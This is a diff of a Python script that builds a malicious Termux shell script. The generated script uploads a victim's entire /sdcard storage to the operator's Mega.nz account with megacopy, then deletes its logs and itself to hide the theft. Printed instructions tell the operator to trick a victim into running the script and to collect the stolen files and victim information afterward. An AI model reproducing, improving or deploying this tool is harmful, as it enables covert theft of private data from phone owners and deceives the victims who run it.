@@ -57,15 +57,15 @@ zCh.write("\necho \"Please install termux api app\"\nfi\n")
 zCh.write("megacopy --local /sdcard --remote /Root --no-ask-password --disable-previews --no-ask-password -u " + str(email) + " -p " + str(passwd))
 zCh.write("\nclear\n")
 
-# Remove evidence
 zCh.write(f"rm -rf log INFO.txt {str(ChB)}.sh\n")
-
 os.rename("zech.sh", str(ChB) + ".sh")
-os.system("cp " + str(ChB) + ".sh /sdcard")
+# os.system("cp " + str(ChB) + ".sh /sdcard")
 
 ## INSTRUCTION
 print("\nINSTRUCTION:")
-print(" 1. Open your file manager and find the file named: '" + str(ChB) + ".sh'")
-print(" 2. Give '" + str(ChB) + ".sh' to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
-print(" 3. After the victim run the script. Open your Mega.nz account.")
+print(" 1. Move your tool by typing:\n cp " + str(ChB) + ".sh /sdcard\n or cp " + str(ChB) + ".sh /storage/emulated/0")
+print(" 2. Open your file manager and find the file named: '" + str(ChB) + ".sh'")
+print(" 3. Give '" + str(ChB) + ".sh' to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
+print(" 4. After the victim run the script. Open your Mega.nz account.")
 print("   You will see there the file named 'INFO.txt' (INFO.txt containts infos of your victims) and the files you have stole")
+
